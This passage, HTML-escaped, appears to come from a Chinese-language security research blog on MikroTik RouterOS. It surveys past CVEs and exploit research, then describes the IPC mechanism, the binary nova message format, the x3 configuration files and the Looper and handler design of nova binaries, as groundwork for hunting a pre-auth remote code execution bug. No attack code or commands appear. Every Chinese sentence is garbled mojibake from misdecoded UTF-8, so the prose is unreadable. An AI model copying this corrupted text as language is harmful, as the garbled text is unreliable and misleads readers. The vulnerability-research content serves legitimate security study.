          &lt;li&gt;ç•¶æ™‚çš„ WinBox å­˜åœ¨ä¸€å€‹å¼±é»ï¼šç•¶æš´éœ²åœ¨å¤–ç¶²æ™‚ï¼Œå¯ä»¥è¢«ç”¨ä¾†å°å…§ç¶²é€²è¡Œæƒæ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;Maximiliano Vidal, Juan Caillava. Finding and exploiting CVE-2018â€“7445&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;é€éé»‘ç®±æ¨¡ç³Šæ¸¬è©¦æ‰¾åˆ° SMB ä¸­çš„ Buffer Overflow ä»¥åŠå®Œæ•´ exploit æ–¹æ³•&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://mum.mikrotik.com/presentations/ID18/presentation_6149_1540240927.pdf&quot;&gt;Tomas Kirnak. Deep-dive: MikroTik exploits - a security analysis&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;è¨è«– CIA æ­¦å™¨åº«ã€ŒVault 7ã€å¤–æ´©å¾Œæ‰€é€ æˆçš„å¤§è¦æ¨¡åˆ©ç”¨äº‹ä»¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Jacob-Baines-Help-Me-Vulnerabilities.-Youre-My-Only-Hope.pdf&quot;&gt;Jacob Baines. Help Me Vulnerabilities Youâ€™re My Only Hope&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;é‡‹å‡ºä¸€å¥—å”åŠ©ä½¿ç”¨è€… jailbreak RouterOS çš„å·¥å…·ï¼Œè®“ä½¿ç”¨è€…æœ‰èƒ½åŠ›æª¢æŸ¥è‡ªå·±çš„æ©Ÿå™¨æ˜¯å¦åœ¨å¤§è¦æ¨¡åˆ©ç”¨äº‹ä»¶ä¸­è¢«å…¥ä¾µ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21&quot;&gt;Jacob Baines. RouterOS: Chain to Root&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;å¦‚ä½•é€éä¸²é€£ DNS poisoning å¼±é»åŠé™ç‰ˆå¼±é»æ‹¿åˆ° shell&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2022
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;D39. Vulnerability Exposure &amp;amp; Notification on Mikrotik (CVE-2021-41987)&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;åœ¨ APT çš„ C2 server ä¸Šç™¼ç¾ä¸€å€‹åˆ©ç”¨ RouterOS 0-day çš„æ­¦å™¨ï¼Œé€éåˆ†ææ‰¾åˆ°æ¼æ´çš„æˆå› &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;æ›´è©³ç´°åœ°é—¡è¿°äº† RouterOS çš„ IPC æ©Ÿåˆ¶ï¼Œä¸¦ä¸”é‡‹å‡ºä¸€å¥—ç¨±ä½œ FOISted çš„ jailbreak å·¥å…·å”åŠ©ç ”ç©¶å“¡åœ¨ amd64 ç‰ˆæœ¬çš„ RouterOS ä¸Šé€²è¡Œè¿‘ä¸€æ­¥çš„ç ”ç©¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://powerofcommunity.net/poc2022/QianChen.pdf&quot;&gt;Qian Chen. MikroTik RouterOS Security: The Forgotten IPC Message&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;é€éæ¨¡ç³Šæ¸¬è©¦åœ¨ IPC ä¸­æŒ–æ˜æ¼æ´&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ipc-èˆ‡-nova-message-å›é¡§&quot;&gt;IPC èˆ‡ Nova Message å›é¡§&lt;/h2&gt;

&lt;p&gt;å¯ä»¥ç™¼ç¾ä¸Šè¿°çš„ç ”ç©¶å¤§éƒ¨åˆ†éƒ½é›¢ä¸é–‹ RouterOS çš„è‡ªè£½ IPCï¼Œæ‰€ä»¥æˆ‘å€‘ä¹Ÿç°¡å–®çš„å°å…¶æ©Ÿåˆ¶é€²è¡Œäº†å›é¡§ã€‚ é€™è£¡ä½¿ç”¨ä¸€å€‹ç°¡å–®çš„ä¾‹å­å° IPC é€²è¡Œèªªæ˜ã€‚&lt;/p&gt;

&lt;p&gt;æ—¥å¸¸ä½¿ç”¨å ´æ™¯ä¸­ï¼Œä½¿ç”¨è€…å¯ä»¥é€é telnet ç™»å…¥è‡³ RouterOSï¼Œä¸¦ä½¿ç”¨ conolse å°è·¯ç”±å™¨é€²è¡Œç®¡ç†ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘æ‹†è§£æ•´å€‹æµç¨‹ä¸­ IPC åƒèˆ‡çš„éƒ¨åˆ†ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç•¶ä½¿ç”¨è€…æ¬²é€é telnet å­˜å– RouterOS çš„ console æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; process æœƒä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execl&lt;/code&gt; å»åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; é€™å€‹ç¨‹å¼ï¼Œä¸¦å‘ä½¿ç”¨è€…ç´¢å–å¸³è™ŸåŠå¯†ç¢¼ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;ç•¶ä½¿ç”¨è€…é€å‡ºå¸³è™Ÿå¯†ç¢¼ä¹‹å¾Œï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process æœƒå°‡å¸³è™Ÿå¯†ç¢¼æ”¾é€² nova message ä¸­ï¼Œç™¼é€è‡³ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process è«‹æ±‚é©—è­‰
&lt;img src=&quot;/assets/img/blog/20240524/7.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process å®Œæˆé©—è­‰å¾Œï¼Œé€é nova message é€šçŸ¥é©—è­‰çš„çµæœ
&lt;img src=&quot;/assets/img/blog/20240524/8.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;å¦‚æœç™»å…¥æˆåŠŸå°±æœƒå–šèµ· &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; processï¼Œæ¥ä¸‹ä¾†ä½¿ç”¨è€…èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; äº’å‹•çš„éç¨‹éƒ½æ˜¯é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process è½‰ç™¼&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ipc-ç°¡ä»‹&quot;&gt;IPC ç°¡ä»‹&lt;/h3&gt;

&lt;p&gt;ä¸Šé¢çš„ä¾‹å­ç°¡å–®åœ°æè¿°äº† IPC çš„åŸºæœ¬æ¦‚å¿µï¼Œä½†å…©å€‹ process é–“çš„æºé€šå¯¦éš›ä¸Šæ›´åŠ è¤‡é›œã€‚é¦–å…ˆï¼Œæ¯å€‹é€å¾€å…¶ä»–ç¨‹å¼çš„ nova message éƒ½æœƒå…ˆé€é socket è¢«é€å¾€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt;ï¼Œæ¥è‘— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; æ‰æ ¹æ“š message å…§å®¹æŠŠ message åˆ†æ´¾çµ¦å°æ‡‰çš„ nova binaryã€‚&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘èˆ‰ä¸€å€‹ç°¡å–®çš„ä¾‹å­ä¾†èªªæ˜ï¼šå‡è¨­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process çš„ id æ˜¯ 1039ï¼›&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process çš„ id æ˜¯ 13ï¼Œä¸” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process ä¸­è² è²¬é©—è­‰å¸³è™Ÿå¯†ç¢¼çš„æ˜¯ id ç‚º 4 çš„ handlerã€‚ å‰‡åœ¨ç™»å…¥é©—è­‰æµç¨‹ä¸­ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process é¦–å…ˆæœƒé€ä¸€å€‹åŒ…å«å¸³è™Ÿå¯†ç¢¼çš„è«‹æ±‚çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; processï¼Œé€™æ™‚çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; æ˜¯ä¸€å€‹åŒ…å«å…©å€‹å…ƒç´ çš„é™£åˆ—ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[13, 4]&lt;/code&gt; ï¼Œè¡¨ç¤ºè¦æŠŠ message é€çµ¦ binary id ç‚º 13 çš„ process ä¸­ id ç‚º 4 çš„ handlerã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç•¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; æ”¶åˆ° message å¾Œï¼Œå®ƒæœƒå…ˆç§»é™¤ message å…§ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ä¸­ä»£è¡¨ç›®æ¨™ binary id çš„ 13ï¼Œä¸¦åœ¨ SYS_FROM ä¸­å¢åŠ ä¾†æº binary çš„ idï¼Œä¹Ÿå°±æ˜¯ 1039ï¼Œä¹‹å¾ŒæŠŠ message å‚³é€çµ¦ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; processã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process æ”¶åˆ° message å¾Œä¹Ÿæœƒåšé¡ä¼¼çš„äº‹æƒ…ï¼Œå°‡&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ä¸­ä»£è¡¨ç›®æ¨™ handler id çš„ 4 ç§»é™¤å¾Œï¼Œæ¥è‘—æŠŠ nova message é€è‡³ handler 4 é€²è¡Œè™•ç†ï¼Œæœ€çµ‚ç”± handler 4 åŸ·è¡Œé©—è­‰çš„é‚è¼¯ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-message-ç°¡ä»‹&quot;&gt;Nova Message ç°¡ä»‹&lt;/h3&gt;

&lt;p&gt;è€Œä¸Šè¿° IPC ä¸­ä½¿ç”¨çš„ nova message æ˜¯ç”± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::message&lt;/code&gt; åŠç›¸é—œçš„ function é€²è¡Œåˆå§‹åŒ–èˆ‡è¨­å®šã€‚Nova message å¯¦éš›ä¸Šæ˜¯ç”±å…·æœ‰å‹åˆ¥çš„ key-value pair æ§‹æˆï¼Œä¸” key åªèƒ½æ˜¯æ•´æ•¸ï¼Œæ‰€ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; ç­‰ key åªæ˜¯å–®ç´”çš„ macro ç½·äº†ã€‚è€Œ nova message ä¸­å¯ä»¥ä½¿ç”¨çš„å‹åˆ¥åŒ…æ‹¬ u32, u64, bool, string, bytes, IP åŠ nova message ï¼ˆä¹Ÿå°±æ˜¯å¯ä»¥å»ºç«‹å·¢ç‹€çš„ nova messageï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› ç‚º RouterOS å·²ä¸ç”¨ JSON ä¾†å‚³é nova messageï¼Œæ‰€ä»¥æˆ‘å€‘åªé‡å° binary æ ¼å¼é€²è¡Œèªªæ˜ã€‚åœ¨ IPC æºé€šéç¨‹ä¸­ï¼Œæ”¶æ–¹çš„ socket é¦–å…ˆæœƒæ”¶åˆ°ä¸€å€‹è¡¨é”ç•¶å‰ nova message é•·åº¦çš„æ•´æ•¸ï¼Œä¹‹å¾Œæ¥è‘— binary æ ¼å¼çš„ nova messageã€‚
&lt;img src=&quot;/assets/img/blog/20240524/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nova message çš„é–‹é ­æ˜¯å…©å€‹ magic bytesï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M2&lt;/code&gt;ã€‚æ¥ä¸‹ä¾†ï¼Œæ¯å€‹ key éƒ½ä½¿ç”¨ 4 bytes ä¾†æè¿°ï¼›å…¶ä¸­ï¼Œå‰ 3 bytes ç”¨ä¾†è¡¨é” key çš„ idï¼Œæœ€å¾Œä¸€å€‹ byte æ˜¯ key çš„å‹åˆ¥ã€‚æ ¹æ“šå‹åˆ¥ï¼Œæœƒä»¥ä¸åŒè§£ææ–¹å¼å°‡ç·Šæ¥åœ¨å¾Œçš„ bytes å–å‡ºä½œç‚º dataï¼Œå–å®Œ data ä¹‹å¾Œï¼Œå¾Œé¢ç·Šæ¥è‘—çš„ä¾¿æ˜¯ä¸‹ä¸€å€‹ keyï¼Œå¦‚æ­¤å¾ªç’°ä¸‹å»ã€‚ç•¶ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ bool å‹åˆ¥ï¼Œå› ç‚º bool å¯ä»¥åƒ…ç”¨ä¸€å€‹ bit è¡¨ç¤ºï¼Œnova message ä¾¿ç›´æ¥ä½¿ç”¨ type çš„æœ€ä½ä¸€ä½ bit ä¾†è¡¨ç¤º True/Falseï¼Œæ›´è©³ç´°çš„æ ¼å¼å¯ä»¥åƒè€ƒ &lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;ï¼š
&lt;img src=&quot;/assets/img/blog/20240524/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x3-format&quot;&gt;x3 format&lt;/h3&gt;

&lt;p&gt;ç‚ºäº†ç­è§£ nova message ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; çš„ id å…·é«”æ˜¯æŒ‡å“ªä¸€å€‹ nova binaryï¼Œæˆ‘å€‘éœ€è¦è§£æä¸€ç¨®å‰¯æª”åç‚º x3 çš„æª”æ¡ˆï¼Œå®ƒæ˜¯ binary æ ¼å¼çš„ xmlã€‚åœ¨æ’°å¯«å·¥å…·è§£æ  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/etc/loader/system.x3&lt;/code&gt; å¾Œï¼Œæˆ‘å€‘ä¾¿å¯å¾—çŸ¥æ¯å€‹ id æ‰€å°æ‡‰çš„æ˜¯å“ªå€‹ nova binaryï¼Œä¾‹å¦‚åœ¨ä¸‹åœ–ä¸­ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/bin/log&lt;/code&gt; çš„ id å°±æ˜¯ 3ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†æœ‰äº› binary çš„ id ä¸¦ä¸åœ¨é€™å€‹æª”æ¡ˆç•¶ä¸­ï¼Œæ˜¯å› ç‚ºè©² binary å¯èƒ½æ˜¯é€éå®‰è£ MikroTik å®˜æ–¹æä¾›çš„ package ä¹‹å¾Œæ‰æœ‰çš„åŠŸèƒ½ï¼Œæ­¤æ™‚ binary çš„ id å°±æœƒå­˜åœ¨æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ram/pckg/&amp;lt;package_name&amp;gt;/nova/etc/loader/&amp;lt;package_name&amp;gt;.x3&lt;/code&gt; ç•¶ä¸­ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; å°±æ˜¯ä¸€ä¾‹ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å„˜ç®¡å¦‚æ­¤ï¼Œä¾èˆŠæœ‰äº› binary id æ˜¯ç„¡æ³•åœ¨ä»»ä½• .x3 æª”æ¡ˆä¸­æ‰¾åˆ°çš„ï¼Œå› ç‚ºé€™é¡å‹çš„ process ä¸¦ä¸æ˜¯æŒä¹…å­˜åœ¨ï¼Œä¾‹å¦‚ï¼šåªæœ‰ä½¿ç”¨è€…å˜—è©¦ç™»å…¥æ™‚æ‰æœƒè¢«å–šèµ·çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; processï¼Œé€™é¡ process å°±ä»¥æµæ°´è™Ÿä½œç‚º idã€‚&lt;/p&gt;

&lt;p&gt;å¦å¤–ï¼Œ.x3 æª”æ¡ˆä¹Ÿè¢«ç”¨ä¾†è¨˜éŒ„ nova binary çš„ç›¸é—œè¨­å®šï¼Œä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; å°±åœ¨ .x3 ä¸­æŒ‡å®šæ¯å€‹ URI æ‡‰è©²ä½¿ç”¨å“ªä¸€å€‹ servlet ä¾†é€²è¡Œè™•ç†ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h2&gt;

&lt;p&gt;ç¶“ç”±å›é¡§äº†éå»çš„ç ”ç©¶åŠ CVEï¼Œå¯ä»¥ç™¼ç¾å¤§å¤šæˆ‘å€‘æ„Ÿèˆˆè¶£çš„æ¼æ´éƒ½é›†ä¸­åœ¨éå»çš„ä¸€æ®µæ™‚é–“å…§ï¼Œè¿‘æœŸä¼¼ä¹å¾ˆé›£åœ¨ RouterOS çš„ WAN ç«¯æ‰¾åˆ° pre-auth çš„æ¼æ´ã€‚ ä¸”é›–ç„¶é€™æœŸé–“æŒçºŒæœ‰æ¼æ´è¢«æ­éœ²ï¼Œä½†å¯ä»¥ç™¼ç¾ MikroTik è®Šå¾—è¶Šä¾†è¶Šå®‰å…¨ã€‚MikroTik ä¸ŠçœŸçš„å·²ç¶“ä¸å­˜åœ¨ pre-auth çš„æ¼æ´äº†å—ï¼Ÿæˆ–è¨±å–®ç´”åªæ˜¯æ‰€æœ‰äººéƒ½æŠŠä»€éº¼æ±è¥¿æ¼çœ‹äº†ï¼Ÿ&lt;/p&gt;

&lt;p&gt;å‰é¢æåŠçš„å…¬é–‹ç ”ç©¶ï¼Œå¯ä»¥ç°¡å–®åˆ†æˆä¸‹é¢ä¸‰é¡ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;è¶Šç„ï¼ˆJailbreakingï¼‰&lt;/li&gt;
  &lt;li&gt;åˆ†æåœ¨é‡çš„ exploit&lt;/li&gt;
  &lt;li&gt;ç ”ç©¶ IPC ä¸­çš„ nova message&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç„¶è€Œåœ¨é€†å‘ RouterOS ä¸Šçš„ binary ä¸€æ®µæ™‚é–“ä¹‹å¾Œï¼Œæˆ‘å€‘ç™¼ç¾æ•´å€‹ç³»çµ±çš„è¤‡é›œåº¦ä¸åƒ…æ–¼æ­¤ï¼Œä½†å»æ²’ä»€éº¼äººæåŠç›¸é—œç´°ç¯€ã€‚å› æ­¤æœ‰äº†ä»¥ä¸‹çš„æ„Ÿæƒ³ï¼šã€Œæ²’æœ‰ä»»ä½•ç†æ™ºæ­£å¸¸çš„äººæƒ³è¦èŠ±æ™‚é–“é€†å‘ nova binaryã€ã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº†å¾ CIA åŠ APT å–å¾—çš„ exploit ä¹‹å¤–ï¼Œå¤§éƒ¨åˆ†åœ¨ RouterOS ä¸Šå°‹æ‰¾æ¼æ´çš„ç ”ç©¶ä¸å¤–ä¹æ˜¯ Fuzzing ç¶²è·¯å”è­°ã€ç©å¼„ nova message æˆ–æ˜¯é‡å° nova message é€²è¡Œæ¨¡ç³Šæ¸¬è©¦ã€‚å¾æˆæœä¾†çœ‹ï¼Œæ”»æ“Šè€…å°æ–¼ RouterOS çš„ç†è§£ä¼¼ä¹é«˜éæˆ‘å€‘å¾ˆå¤šï¼Œæˆ‘å€‘éœ€è¦æ¢ç´¢æ›´å¤šé—œæ–¼ nova binary çš„ç´°ç¯€ä¾†å½Œè£œå·®è·ï¼Œæ‰æœ‰æ©Ÿæœƒæ‰¾åˆ°æˆ‘å€‘æƒ³è¦æ‰¾çš„æ¼æ´ã€‚é›–ç„¶æˆ‘å€‘ä¸¦ä¸åå° fuzzing é€™å€‹æ‰‹æ³•ï¼Œä½†è‹¥è¦åœ¨é€™å ´æ¯”è³½ä¸­å–å¾—å„ªå‹¢ï¼Œæˆ‘å€‘å°±å¿…é ˆç¢ºå®šæ‰€æœ‰ç´°ç¯€éƒ½è¢«è¦ªçœ¼çœ‹éã€‚&lt;/p&gt;

&lt;h2 id=&quot;å¾ä½•é–‹å§‹&quot;&gt;å¾ä½•é–‹å§‹&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘ä¸èªç‚º RouterOS å·²ç¶“å®Œç¾ç„¡æš‡ï¼Œè€Œä¸”ä¸é›£ç™¼ç¾ç ”ç©¶å“¡èˆ‡æ”»æ“Šè€…å°æ–¼ RouterOS çš„ç†è§£å­˜åœ¨è‘—å·®è·ã€‚æ‰€ä»¥ï¼Œè¦åœ¨ RouterOS ä¸Šæ‰¾åˆ° pre-auth RCE æˆ‘å€‘é‚„ç¼ºå°‘ä»€éº¼ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é¦–å…ˆæˆ‘å€‘æƒ³åˆ°çš„ç¬¬ä¸€å€‹å•é¡Œæ˜¯ï¼šIPC çš„å…¥å£é»åœ¨å“ªè£¡ï¼Œå®ƒåˆé€šå¾€å“ªè£¡ï¼Ÿå¤§éƒ¨åˆ†é€é IPC è§¸ç™¼çš„åŠŸèƒ½éƒ½éœ€è¦é€²è¡Œç™»å…¥ï¼Œæ‰€ä»¥å¯ä»¥é æœŸåˆ°ï¼šæ‹˜æ³¥æ–¼ IPCï¼Œåªæœƒæ‰¾åˆ°æ›´å¤š post-auth çš„å¼±é»ã€‚ä¸” IPC ä¸éåªæ˜¯ RouterOS ä¸Šç”¨ä¾†å¯¦ä½œä¸»è¦åŠŸèƒ½çš„å…¶ä¸­ä¸€å€‹ç’°ç¯€ï¼Œæˆ‘å€‘æ›´æƒ³ç›´æ¥ã€è¬¹æ…çš„è§€å¯Ÿæ¯å€‹åŠŸèƒ½çš„æ ¸å¿ƒç¨‹å¼ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;èˆ‰ä¾‹ä¾†èªªï¼šè² è²¬è™•ç† DHCP çš„ process æ˜¯å¦‚ä½•å¾ä¸€å€‹ DHCP å°åŒ…ä¸­æ“·å–éœ€è¦çš„è³‡è¨Šï¼Ÿé€™äº›è³‡è¨Šå¯èƒ½ç›´æ¥è¢«å­˜åœ¨è©² process ä¸­ï¼Œæˆ–å¯èƒ½éœ€è¦é€é IPC é€çµ¦å…¶ä»– process åšé€²ä¸€æ­¥è™•ç†ã€‚
&lt;img src=&quot;/assets/img/blog/20240524/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-binary-çš„æ¶æ§‹&quot;&gt;Nova Binary çš„æ¶æ§‹&lt;/h3&gt;

&lt;p&gt;å› æ­¤æˆ‘å€‘å¿…é ˆå…ˆèªè­˜ nova binary çš„æ¶æ§‹ï¼Œæ¯å€‹ nova binary ä¸­éƒ½æœ‰ä¸€å€‹ Looperï¼ˆæˆ–å…¶è¡ç”Ÿé¡åˆ¥ï¼šMultifiberLooperï¼‰ï¼ŒLooper æ˜¯è² è²¬åŸ·è¡Œ event loop é‚è¼¯çš„ä¸€å€‹é¡åˆ¥ï¼Œæ¯æ¬¡è¿­ä»£éƒ½æœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runTimer&lt;/code&gt; ä¾†åŸ·è¡Œæ™‚é–“åˆ°äº†çš„ timer ï¼Œä»¥åŠå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; å»æª¢æŸ¥ socket çš„ç‹€æ…‹ä¸¦åšç›¸å°æ‡‰çš„è™•ç†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looper ä¹Ÿè² è²¬è‡ªå·±æ‰€åœ¨çš„ nova binary èˆ‡ loader ä¹‹é–“çš„æºé€šï¼ŒLooper é¦–å…ˆæœƒå…ˆæœƒé‡å°ç•¶å‰ binary èˆ‡ loader ä¹‹é–“çš„ unix socket è¨»å†Šä¸€å€‹ç‰¹åˆ¥çš„ callback functionï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onMsgSock&lt;/code&gt;ï¼Œé€™å€‹å‡½å¼è² è²¬æŠŠå¾ socket æ”¶åˆ°çš„ nova message åˆ†é…çµ¦ nova binary ä¸­å°æ‡‰çš„ handlerã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;handler-é¡åˆ¥èˆ‡å…¶è¡ç”Ÿé¡&quot;&gt;Handler é¡åˆ¥èˆ‡å…¶è¡ç”Ÿé¡&lt;/h3&gt;

&lt;p&gt;ç•¶ Looper æ”¶åˆ°ä¸€å€‹ nova message æ™‚ï¼Œå®ƒæœƒå°‡ä¹‹åˆ†æ´¾çµ¦å°æ‡‰çš„ handlerã€‚ä¾‹å¦‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14, 0]&lt;/code&gt; çš„è¨Šæ¯æœƒè¢« loader åˆ†é…çµ¦ binary id ç‚º 14 çš„ nova binaryï¼Œè€Œ binary id ç‚º 14 çš„ binary ä¸­çš„ looper æ”¶åˆ°æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; å·²ç¶“å‰©ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0]&lt;/code&gt;ï¼Œå› æ­¤ looper æœƒå°‡å…¶åˆ†é…çµ¦ handler 0 é€²è¡Œè™•ç†ã€‚å¦‚æœä¸€é–‹å§‹çš„ nova message ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14]&lt;/code&gt;ï¼Œå‰‡ looper æ”¶åˆ°æ™‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt;ï¼Œé€™ç¨®æƒ…å¢ƒå°‡ç”± Looper è‡ªè¡Œè™•ç†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

